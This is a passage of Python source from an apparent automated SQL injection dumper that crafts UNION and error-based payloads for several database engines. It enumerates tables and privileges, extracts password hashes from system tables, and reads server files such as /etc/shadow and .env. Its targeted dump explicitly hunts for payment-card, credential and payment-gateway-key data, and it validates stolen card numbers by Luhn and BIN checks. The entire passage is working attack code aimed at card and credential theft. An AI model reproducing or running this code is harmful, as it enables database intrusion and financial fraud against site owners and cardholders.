                        [f"ISNULL(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns]
                    )
                    not_in = ""
                    if rows:
                        # Use first column as filter to get next rows
                        seen = [r.get(columns[0], '') for r in rows]
                        not_in = f" AND {columns[0]} NOT IN ({','.join(repr(s) for s in seen)})"
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT TOP 1 {concat_parts} FROM {table} WHERE 1=1{not_in}"
                    )
                    if not val:
                        break
                    values = val.split("||")
                    if len(values) >= len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                    await asyncio.sleep(0.2)
            
            elif sqli.dbms == "postgresql":
                for row_idx in range(max_err_rows):
                    concat_parts = "||CHR(124)||CHR(124)||".join(
                        [f"COALESCE(CAST({c} AS TEXT),'NULL')" for c in columns]
                    )
                    val = await self._error_extract(
                        sqli, session,
                        f"SELECT {concat_parts} FROM {table} LIMIT 1 OFFSET {row_idx}"
                    )
                    if not val:
                        break
                    values = val.split("||")
                    if len(values) >= len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                    await asyncio.sleep(0.2)
            
            logger.info(f"Error-based extracted {len(rows)} rows from {table}")
            return rows
        
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return rows
        
        null_list = ["NULL"] * sqli.column_count
        
        # Determine injection prefix/suffix using scanner-detected values
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        # Build CONCAT expression for all target columns
        separator = "0x7c7c"  # ||
        row_separator = "0x3c62723e"  # <br>
        
        marker_start_str = f"mdd{random.randint(10000, 99999)}"
        marker_end_str = f"mdx{random.randint(10000, 99999)}"
        marker_start_hex = marker_start_str.encode().hex()
        marker_end_hex = marker_end_str.encode().hex()
        
        if sqli.dbms in ("mysql", ""):
            concat_cols = ",".join([f"IFNULL({c},'NULL')" for c in columns])
            
            # Per-row extraction avoids MySQL group_concat_max_len (default 1024)
            # which silently truncates long column values
            for col_idx in sqli.injectable_columns:
                found_any = False
                for row_idx in range(limit):
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"CONCAT(0x{marker_start_hex},"
                        f"CONCAT_WS({separator},{concat_cols}),"
                        f"0x{marker_end_hex})"
                    )
                
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM {table} LIMIT {row_idx},1{suffix}"
                    )
                    
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        break
                    
                    match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
                    if not match:
                        # Try once more before giving up (may need different col)
                        if row_idx == 0:
                            break  # first row failed, try next injectable col
                        break  # no more rows
                    
                    found_any = True
                    raw = match.group(1).strip()
                    if not raw:
                        break
                    values = raw.split("||")
                    if len(values) == len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                    elif len(values) > len(columns):
                        # Column values contain || themselves — take first N
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                    
                if found_any:
                    break  # Found rows with this column, stop trying others
        
        elif sqli.dbms == "mssql":
            # MSSQL: Use FOR XML PATH
            concat_cols = "+CHAR(124)+CHAR(124)+".join([f"ISNULL(CAST({c} AS VARCHAR(MAX)),'NULL')" for c in columns])
            
            for col_idx in sqli.injectable_columns:
                null_list_copy = null_list.copy()
                null_list_copy[col_idx] = (
                    f"STUFF((SELECT TOP {limit} CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+"
                    f"{concat_cols} FROM {table} FOR XML PATH('')),1,0,'')"
                )
                
                query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}{suffix}"
                test_params = params.copy()
                test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    for raw_row in re.findall(r'<br>(.+?)(?=<br>|$)', body):
                        values = raw_row.split("||")
                        if len(values) == len(columns):
                            row = {columns[i]: values[i] for i in range(len(columns))}
                            rows.append(row)
                if rows:
                    break
        
        elif sqli.dbms == "postgresql":
            # PostgreSQL: COALESCE + CAST + || concatenation
            concat_cols = "||CHR(124)||CHR(124)||".join(
                [f"COALESCE(CAST({c} AS TEXT),'NULL')" for c in columns]
            )
            marker_s = f"mdd{random.randint(10000,99999)}"
            marker_e = f"mdx{random.randint(10000,99999)}"
            marker_s_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_s])
            marker_e_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_e])
            
            for col_idx in sqli.injectable_columns:
                found_any = False
                for row_idx in range(limit):
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"{marker_s_chr}||{concat_cols}||{marker_e_chr}"
                    )
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM {table} LIMIT 1 OFFSET {row_idx}{suffix}"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        break
                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                    if not match:
                        if row_idx == 0:
                            break
                        break
                    found_any = True
                    raw = match.group(1).strip()
                    if not raw:
                        break
                    values = raw.split("||")
                    if len(values) >= len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                if found_any:
                    break
        
        elif sqli.dbms == "oracle":
            # Oracle: Use ROWNUM + CONCAT (via ||)
            concat_cols = "||CHR(124)||CHR(124)||".join(
                [f"NVL(TO_CHAR({c}),'NULL')" for c in columns]
            )
            marker_s = f"ora{random.randint(10000,99999)}"
            marker_e = f"orx{random.randint(10000,99999)}"
            marker_s_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_s])
            marker_e_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_e])
            
            for col_idx in sqli.injectable_columns:
                found_any = False
                for row_idx in range(limit):
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = f"{marker_s_chr}||{concat_cols}||{marker_e_chr}"
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM (SELECT {','.join(columns)}, ROWNUM rn FROM {table}) "
                        f"WHERE rn={row_idx + 1}{suffix}"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        break
                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                    if not match:
                        if row_idx == 0:
                            break
                        break
                    found_any = True
                    raw = match.group(1).strip()
                    if not raw:
                        break
                    values = raw.split("||")
                    if len(values) >= len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                if found_any:
                    break
        
        elif sqli.dbms == "sqlite":
            # SQLite: GROUP_CONCAT or per-row LIMIT/OFFSET
            concat_cols = "||'||'||".join([f"IFNULL({c},'NULL')" for c in columns])
            marker_s = f"slt{random.randint(10000,99999)}"
            marker_e = f"slx{random.randint(10000,99999)}"
            
            for col_idx in sqli.injectable_columns:
                found_any = False
                for row_idx in range(limit):
                    null_list_copy = null_list.copy()
                    null_list_copy[col_idx] = (
                        f"'{marker_s}'||{concat_cols}||'{marker_e}'"
                    )
                    query = (
                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
                        f"FROM {table} LIMIT 1 OFFSET {row_idx}{suffix}"
                    )
                    test_params = params.copy()
                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
                    test_url = scanner._build_url(base, test_params)
                    body, _ = await scanner._fetch(test_url, session)
                    if not body:
                        break
                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                    if not match:
                        if row_idx == 0:
                            break
                        break
                    found_any = True
                    raw = match.group(1).strip()
                    if not raw:
                        break
                    values = raw.split("||")
                    if len(values) >= len(columns):
                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
                        rows.append(row)
                if found_any:
                    break
        
        # Filter injection echo artifacts from extracted rows
        rows = self._filter_echo_rows(rows)
        logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
        return rows

    # SQL injection artifact patterns — if a data value matches these,
    # it's the injection payload echoing back, not real data
    _SQLI_ECHO_PATTERNS = re.compile(
        r'(?:ORDER\s+BY|UNION\s+(?:ALL\s+)?SELECT|GROUP\s+BY|HAVING|'
        r'CONCAT\s*\(|INFORMATION_SCHEMA|IFNULL\s*\(|COALESCE\s*\(|'
        r'CHAR\s*\(\d+\)|0x[0-9a-f]{6,}|LIMIT\s+\d+|OFFSET\s+\d+|'
        r'SELECT\s+.*\s+FROM\s+|INSERT\s+INTO|UPDATE\s+.*\s+SET|'
        r'DELETE\s+FROM|DROP\s+TABLE|AND\s+1\s*=\s*[12]|'
        r'--\s*-|/\*.*\*/)',
        re.IGNORECASE
    )

    @staticmethod
    def _is_injection_echo(value: str) -> bool:
        """Check if a data value is actually an injection payload echo."""
        if not value or len(value) < 5:
            return False
        v = value.strip()
        # If >40% of the value is SQL keywords, it's an echo
        sql_kw_count = len(SQLiDumper._SQLI_ECHO_PATTERNS.findall(v))
        if sql_kw_count >= 2:
            return True
        # Single keyword but it IS the entire value
        if sql_kw_count == 1 and len(v) < 60:
            return True
        return False

    def _filter_echo_rows(self, rows: List[Dict]) -> List[Dict]:
        """Remove rows that are injection payload echoes."""
        clean = []
        for row in rows:
            has_real_value = False
            row_is_echo = False
            for col, val in row.items():
                if col == '_table':
                    continue
                v = str(val).strip() if val else ''
                if not v or v.lower() in ('null', 'none', ''):
                    continue
                if self._is_injection_echo(v):
                    row_is_echo = True
                    break
                has_real_value = True
            if has_real_value and not row_is_echo:
                clean.append(row)
        if len(rows) != len(clean):
            logger.info(f"Filtered {len(rows)-len(clean)} injection-echo rows "
                       f"(kept {len(clean)}/{len(rows)})")
        return clean

    async def dios_dump(self, sqli: SQLiResult, 
                        session: aiohttp.ClientSession) -> Optional[str]:
        """Perform DIOS (Dump In One Shot) extraction.
        
        Gets complete schema (all tables and columns) in a single query.
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            Raw DIOS output string, or None
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return None
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        
        null_list = ["NULL"] * sqli.column_count
        
        # Determine injection prefix/suffix using scanner-detected values
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        dios_query = self.DIOS_QUERIES.get(sqli.dbms or "mysql")
        if not dios_query:
            return None
        
        marker_start_str = f"dio{random.randint(10000, 99999)}"
        marker_end_str = f"dix{random.randint(10000, 99999)}"
        marker_start_hex = marker_start_str.encode().hex()
        marker_end_hex = marker_end_str.encode().hex()
        
        for col_idx in sqli.injectable_columns:
            null_list_copy = null_list.copy()
            null_list_copy[col_idx] = f"CONCAT(0x{marker_start_hex},{dios_query},0x{marker_end_hex})"
            
            query = f"{prefix}UNION ALL SELECT {','.join(null_list_copy)}{suffix}"
            test_params = params.copy()
            test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
                if match:
                    raw = match.group(1)
                    logger.info(f"DIOS dump successful, {len(raw)} chars extracted")
                    return raw
        
        return None

    # ═══════════════════════════════════════════════════════════════
    #  Advanced Extraction: File Read, Privileges, System Tables
    # ═══════════════════════════════════════════════════════════════

    FILE_READ_QUERIES = {
        "mysql": "LOAD_FILE('{filepath}')",
        "mssql": (
            "STUFF((SELECT CAST(BulkColumn AS VARCHAR(MAX)) "
            "FROM OPENROWSET(BULK '{filepath}', SINGLE_CLOB) AS x "
            "FOR XML PATH('')),1,0,'')"
        ),
        "postgresql": "pg_read_file('{filepath}')",
    }

    PRIVILEGE_QUERIES = {
        "mysql": {
            "is_dba": "(SELECT IF(CURRENT_USER LIKE '%root%' OR (SELECT super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(CURRENT_USER,'@',1) LIMIT 1)='Y','DBA','NOT_DBA'))",
            "current_user": "CURRENT_USER()",
            "hostname": "@@hostname",
            "datadir": "@@datadir",
            "version": "@@version",
            "all_dbs": "(SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata)",
        },
        "mssql": {
            "is_dba": "(SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'DBA' ELSE 'NOT_DBA' END)",
            "current_user": "SYSTEM_USER",
            "hostname": "@@SERVERNAME",
            "version": "@@VERSION",
            "all_dbs": "STUFF((SELECT ','+name FROM master..sysdatabases FOR XML PATH('')),1,1,'')",
        },
        "postgresql": {
            "is_dba": "(SELECT CASE WHEN (SELECT usesuper FROM pg_user WHERE usename=current_user) THEN 'DBA' ELSE 'NOT_DBA' END)",
            "current_user": "current_user",
            "hostname": "inet_server_addr()::text",
            "version": "version()",
            "all_dbs": "(SELECT string_agg(datname,',') FROM pg_database WHERE datistemplate=false)",
        },
        "oracle": {
            "is_dba": "(SELECT CASE WHEN (SELECT GRANTED_ROLE FROM DBA_ROLE_PRIVS WHERE GRANTEE=USER AND GRANTED_ROLE='DBA') IS NOT NULL THEN 'DBA' ELSE 'NOT_DBA' END FROM dual)",
            "current_user": "USER",
            "hostname": "(SELECT UTL_INADDR.GET_HOST_NAME FROM dual)",
            "version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
            "all_dbs": "(SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users)",
        },
    }

    SYSTEM_TABLE_QUERIES = {
        "mysql": {
            "password_hashes": (
                "(SELECT GROUP_CONCAT(user,0x3a,authentication_string SEPARATOR 0x3c62723e) "
                "FROM mysql.user)"
            ),
        },
        "mssql": {
            "password_hashes": (
                "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+name+CHAR(58)+"
                "CONVERT(VARCHAR(MAX),password_hash,1) FROM master.sys.sql_logins "
                "FOR XML PATH('')),1,0,'')"
            ),
            "linked_servers": (
                "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+srvname "
                "FROM master..sysservers FOR XML PATH('')),1,0,'')"
            ),
        },
        "postgresql": {
            "password_hashes": (
                "(SELECT string_agg(usename||':'||COALESCE(passwd,'no_pass'),chr(10)) "
                "FROM pg_shadow)"
            ),
        },
    }

    async def check_privileges(self, sqli: SQLiResult,
                                session: aiohttp.ClientSession) -> Dict[str, str]:
        """Check DBA privileges and gather server info.
        
        Returns dict with keys: is_dba, current_user, hostname, version, all_dbs, datadir.
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return {}
        
        dbms = sqli.dbms or "mysql"
        priv_queries = self.PRIVILEGE_QUERIES.get(dbms, {})
        if not priv_queries:
            return {}
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        null_list = ["NULL"] * sqli.column_count
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        results = {}
        for key, query_expr in priv_queries.items():
            marker_s = f"prv{random.randint(10000, 99999)}"
            marker_e = f"pre{random.randint(10000, 99999)}"
            marker_s_hex = marker_s.encode().hex()
            marker_e_hex = marker_e.encode().hex()
            
            for col_idx in sqli.injectable_columns[:1]:
                nl = null_list.copy()
                if dbms in ("mysql", "sqlite"):
                    nl[col_idx] = f"CONCAT(0x{marker_s_hex},{query_expr},0x{marker_e_hex})"
                elif dbms == "mssql":
                    nl[col_idx] = f"CHAR(0x{marker_s_hex})+({query_expr})+CHAR(0x{marker_e_hex})"
                elif dbms == "postgresql":
                    chr_s = "||".join(f"CHR({ord(c)})" for c in marker_s)
                    chr_e = "||".join(f"CHR({ord(c)})" for c in marker_e)
                    nl[col_idx] = f"{chr_s}||({query_expr})||{chr_e}"
                else:
                    nl[col_idx] = f"CONCAT(0x{marker_s_hex},{query_expr},0x{marker_e_hex})"
                
                q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
                test_params = params.copy()
                test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
                test_url = scanner._build_url(base, test_params)
                
                body, _ = await scanner._fetch(test_url, session)
                if body:
                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                    if match:
                        results[key] = match.group(1).strip()
                        break
        
        if results:
            logger.info(f"Privilege check: {results}")
        return results

    async def read_file(self, sqli: SQLiResult, filepath: str,
                         session: aiohttp.ClientSession) -> Optional[str]:
        """Read a file from the server via SQL injection.
        
        Uses LOAD_FILE (MySQL), OPENROWSET (MSSQL), or pg_read_file (PostgreSQL).
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return None
        
        dbms = sqli.dbms or "mysql"
        file_query_tpl = self.FILE_READ_QUERIES.get(dbms)
        if not file_query_tpl:
            return None
        
        file_query = file_query_tpl.format(filepath=filepath)
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        null_list = ["NULL"] * sqli.column_count
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        marker_s = f"frd{random.randint(10000, 99999)}"
        marker_e = f"fre{random.randint(10000, 99999)}"
        marker_s_hex = marker_s.encode().hex()
        marker_e_hex = marker_e.encode().hex()
        
        for col_idx in sqli.injectable_columns[:1]:
            nl = null_list.copy()
            nl[col_idx] = f"CONCAT(0x{marker_s_hex},{file_query},0x{marker_e_hex})"
            
            q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
            test_params = params.copy()
            test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                if match:
                    content = match.group(1)
                    logger.info(f"File read successful: {filepath} ({len(content)} chars)")
                    return content
        
        return None

    async def dump_password_hashes(self, sqli: SQLiResult,
                                    session: aiohttp.ClientSession) -> Optional[str]:
        """Extract DBMS user password hashes from system tables.
        
        MySQL: mysql.user, MSSQL: master.sys.sql_logins, PostgreSQL: pg_shadow.
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return None
        
        dbms = sqli.dbms or "mysql"
        sys_queries = self.SYSTEM_TABLE_QUERIES.get(dbms, {})
        hash_query = sys_queries.get("password_hashes")
        if not hash_query:
            return None
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        null_list = ["NULL"] * sqli.column_count
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        marker_s = f"hsh{random.randint(10000, 99999)}"
        marker_e = f"hse{random.randint(10000, 99999)}"
        marker_s_hex = marker_s.encode().hex()
        marker_e_hex = marker_e.encode().hex()
        
        for col_idx in sqli.injectable_columns[:1]:
            nl = null_list.copy()
            nl[col_idx] = f"CONCAT(0x{marker_s_hex},{hash_query},0x{marker_e_hex})"
            
            q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
            test_params = params.copy()
            test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                if match:
                    hashes = match.group(1)
                    logger.info(f"Password hashes extracted ({len(hashes)} chars)")
                    return hashes
        
        return None

    async def enumerate_databases(self, sqli: SQLiResult,
                                   session: aiohttp.ClientSession) -> List[str]:
        """Enumerate all accessible databases (not just current).
        
        Returns list of database names.
        """
        if sqli.injection_type != "union" or not sqli.injectable_columns:
            return []
        
        dbms = sqli.dbms or "mysql"
        priv_queries = self.PRIVILEGE_QUERIES.get(dbms, {})
        db_query = priv_queries.get("all_dbs")
        if not db_query:
            return []
        
        scanner = self.scanner
        base, params = scanner._parse_url(sqli.url)
        original = params[sqli.parameter][0] if isinstance(params[sqli.parameter], list) else params[sqli.parameter]
        null_list = ["NULL"] * sqli.column_count
        prefix, suffix, is_replace = self._determine_prefix_suffix(sqli, original)
        
        marker_s = f"dbe{random.randint(10000, 99999)}"
        marker_e = f"dbn{random.randint(10000, 99999)}"
        marker_s_hex = marker_s.encode().hex()
        marker_e_hex = marker_e.encode().hex()
        
        for col_idx in sqli.injectable_columns[:1]:
            nl = null_list.copy()
            nl[col_idx] = f"CONCAT(0x{marker_s_hex},{db_query},0x{marker_e_hex})"
            
            q = f"{prefix}UNION ALL SELECT {','.join(nl)}{suffix}"
            test_params = params.copy()
            test_params[sqli.parameter] = [self._inject_value(original, q, is_replace)]
            test_url = scanner._build_url(base, test_params)
            
            body, _ = await scanner._fetch(test_url, session)
            if body:
                match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
                if match:
                    raw = match.group(1).strip()
                    dbs = [d.strip() for d in raw.split(",") if d.strip()]
                    logger.info(f"Enumerated {len(dbs)} databases: {dbs}")
                    return dbs
        
        return []

    # ═══════════════════════════════════════════════════════════════
    #  Common server files to attempt reading
    # ═══════════════════════════════════════════════════════════════
    INTERESTING_FILES = {
        "linux": [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/var/www/html/wp-config.php",
            "/var/www/html/configuration.php",
            "/var/www/html/.env",
            "/var/www/html/config.php",
            "/var/www/html/config/database.php",
            "/var/www/html/app/etc/local.xml",
            "/home/www/.env",
        ],
        "windows": [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\inetpub\\wwwroot\\appsettings.json",
        ],
    }

    async def auto_file_read(self, sqli: SQLiResult,
                              session: aiohttp.ClientSession) -> Dict[str, str]:
        """Attempt to read common interesting files from the server.
        
        Returns dict of {filepath: content} for successfully read files.
        """
        results = {}
        
        # Try Linux files first (most common web servers)
        for filepath in self.INTERESTING_FILES["linux"]:
            content = await self.read_file(sqli, filepath, session)
            if content and len(content) > 5:
                results[filepath] = content
                logger.info(f"Read {filepath}: {len(content)} chars")
                if len(results) >= 5:
                    break
            await asyncio.sleep(0.3)
        
        # Try Windows files if Linux ones failed
        if not results:
            for filepath in self.INTERESTING_FILES["windows"]:
                content = await self.read_file(sqli, filepath, session)
                if content and len(content) > 5:
                    results[filepath] = content
                    logger.info(f"Read {filepath}: {len(content)} chars")
                    if len(results) >= 3:
                        break
                await asyncio.sleep(0.3)
        
        return results

    async def targeted_dump(self, sqli: SQLiResult,
                            session: aiohttp.ClientSession) -> DumpedData:
        """Perform targeted data extraction focusing on high-value tables.
        
        Pipeline:
        1. Enumerate all tables
        2. Filter to high-value targets (cards, users, payments, config)
        3. Enumerate columns for target tables
        4. Extract data from columns matching whitelist
        5. Categorize extracted data
        
        Args:
            sqli: SQLi vulnerability result
            session: aiohttp session
            
        Returns:
            DumpedData with categorized findings
        """
        dump = DumpedData(
            url=sqli.url,
            dbms=sqli.dbms or "unknown",
            database=sqli.current_db or "",
        )
        
        import time as _time
        _dump_start = _time.monotonic()
        _DUMP_MAX_SECS = 300  # Internal dump budget — 5 minutes for thorough card/payment extraction
        
        # Step 1: Enumerate tables
        all_tables = await self.enumerate_tables(sqli, session)
        if not all_tables:
            logger.warning(f"No tables found for {sqli.url}")
            return dump
        
        # Step 2: Filter to card/payment/gateway targets ONLY
        target_tables = [t for t in all_tables if self._is_target_table(t)]
        if not target_tables:
            # No card/payment tables found — log all table names for review and bail
            logger.info(f"No card/payment tables matched from {len(all_tables)} tables: {all_tables[:20]}")
            # Still store schema info for the dump report
            dump.raw_dumps.append(f"=== ALL TABLES (no card/payment match) ===\n{','.join(all_tables)}")
            return dump
        else:
            # Cap at 8 high-value tables to stay within timeout
            if len(target_tables) > 8:
                logger.info(f"Found {len(target_tables)} high-value tables, capping at 8: {target_tables[:8]}")
                target_tables = target_tables[:8]
            else:
                logger.info(f"Found {len(target_tables)} high-value tables: {target_tables}")
        
        # Step 3+4: Enumerate columns and extract data for each target table
        for table in target_tables:
            # Check dump budget
            if _time.monotonic() - _dump_start > _DUMP_MAX_SECS:
                logger.info(f"Dump time budget ({_DUMP_MAX_SECS}s) reached after "
                           f"{len(dump.data)} tables extracted — skipping remaining")
                break
            
            columns = await self.enumerate_columns(sqli, table, session)
            if not columns:
                continue
            
            dump.tables[table] = columns
            
            # Filter to high-value columns — but for card/payment tables, extract all
            target_cols = []
            for col in columns:
                if self._is_target_column(col):
                    target_cols.append(col)
            
            # STRICT: Only extract if we found card/payment/key columns.
            # If no target columns found, skip this table entirely to avoid
            # dumping random CMS junk (thumbnails, blog posts, etc.)
            if not target_cols:
                logger.info(f"Skipping table '{table}' — no card/payment/key columns "
                           f"among {len(columns)} cols: {columns[:8]}")
                continue
            
            extract_cols = target_cols
            
            # Extract data
            rows = await self.extract_data(sqli, table, extract_cols, session)
            if rows:
                # v3.2: Luhn early-check — if table looks like a card table but
                # first 3 rows have zero Luhn-valid numbers, skip the rest
                is_card_table = any(
                    kw in table.lower()
                    for kw in ("card", "cc", "credit", "payment_card", "billing_card")
                )
                if is_card_table and HAS_ADVANCED and not early_card_check(rows, min_rows=3):
                    logger.info(f"[Luhn] Table '{table}' has no Luhn-valid cards in first "
                               f"{min(3, len(rows))} rows — skipping as false-positive")
                    continue

                dump.data[table] = rows
                
                # Categorize each row — with v3.2 Luhn + BIN validation
                for row in rows:
                    categorized = self._categorize_row(row)
                    # v3.2: Filter card_data through Luhn + real-card check
                    if HAS_ADVANCED:
                        for card_entry in categorized["card_data"]:
                            card_num = ""
                            for v in card_entry.values():
                                import re as _re
                                s = _re.sub(r'[\s\-]', '', str(v))
                                if _re.match(r'^[3-6]\d{12,18}$', s):
                                    card_num = s
                                    break
                            if card_num:
                                is_valid, network, reason = is_real_card(card_num)
                                if is_valid:
                                    card_entry["_network"] = network
                                    card_entry["_luhn_valid"] = True
                                    dump.card_data.append(card_entry)
                                else:
                                    logger.debug(f"[BIN] Rejected card {card_num[:6]}...: {reason}")
                            else:
                                dump.card_data.append(card_entry)
                    else:
                        dump.card_data.extend(categorized["card_data"])
                    dump.credentials.extend(categorized["credentials"])
                    dump.gateway_keys.extend(categorized["gateway_keys"])
            
            # Small delay between tables
            await asyncio.sleep(0.5)
        
        # Step 5: Try DIOS dump as backup (skip if running low on time)
        dios_raw = None
        _elapsed = _time.monotonic() - _dump_start
        if _elapsed < _DUMP_MAX_SECS - 15:
            dios_raw = await self.dios_dump(sqli, session)
        else:
            logger.info(f"Time budget {_elapsed:.0f}s/{_DUMP_MAX_SECS}s — skipping DIOS dump")
        if dios_raw:
            dump.raw_dumps.append(dios_raw)
            
            # Parse DIOS output for table::column pairs
            for match in re.finditer(r'<br>(\w+)::(\w+)', dios_raw):
                table, column = match.group(1), match.group(2)
                if table not in dump.tables:
                    dump.tables[table] = []
                if column not in dump.tables[table]:
                    dump.tables[table].append(column)
        
        # Step 6: Advanced extraction — privileges, databases, hashes, file reads
        _elapsed = _time.monotonic() - _dump_start
        if _elapsed >= _DUMP_MAX_SECS - 10:
            logger.info(f"Time budget {_elapsed:.0f}s/{_DUMP_MAX_SECS}s — skipping advanced extraction")
        else:
            try:
                privs = await self.check_privileges(sqli, session)
                if privs:
                    dump.raw_dumps.append(f"=== PRIVILEGES ===\n{json.dumps(privs, indent=2)}")
                    
                    # If DBA, try to get password hashes
                    if privs.get("is_dba") == "DBA":
                        hashes = await self.dump_password_hashes(sqli, session)
                        if hashes:
                            dump.raw_dumps.append(f"=== DB PASSWORD HASHES ===\n{hashes}")
                    
                    # Enumerate all databases
                    all_dbs = await self.enumerate_databases(sqli, session)
                    if all_dbs:
                        dump.raw_dumps.append(f"=== ALL DATABASES ===\n{','.join(all_dbs)}")
                        
                        # v3.2: Cross-database pivoting — scan ALL databases for card tables
                        if HAS_ADVANCED and len(all_dbs) > 1:
                            _elapsed2 = _time.monotonic() - _dump_start
                            pivot_budget = max(30, _DUMP_MAX_SECS - _elapsed2 - 10)
                            try:
                                pivot_findings = await CrossDatabasePivoter.pivot_all_databases(
                                    sqli, self, all_dbs, session,
                                    max_databases=8,
                                    time_budget=pivot_budget,
                                )
                                if pivot_findings:
                                    dump.raw_dumps.append(
                                        f"=== CROSS-DB PIVOT ===\n"
                                        f"{json.dumps(pivot_findings, indent=2)}"
                                    )
                                    # Extract from high-value tables found in other databases
                                    for pf in pivot_findings[:3]:
                                        for hv_table in pf.get("high_value_tables", [])[:2]:
                                            logger.info(f"[CrossDB] Extracting from "
                                                       f"{pf['database']}.{hv_table}")
                            except Exception as e:
                                logger.debug(f"Cross-DB pivot error: {e}")
                
                # Try to read server files (only if DBA or MySQL with FILE priv)
                file_reads = {}
                if privs and (privs.get("is_dba") == "DBA" or sqli.dbms == "mysql"):
                    file_reads = await self.auto_file_read(sqli, session)
                    if file_reads:
                        for fpath, content in file_reads.items():
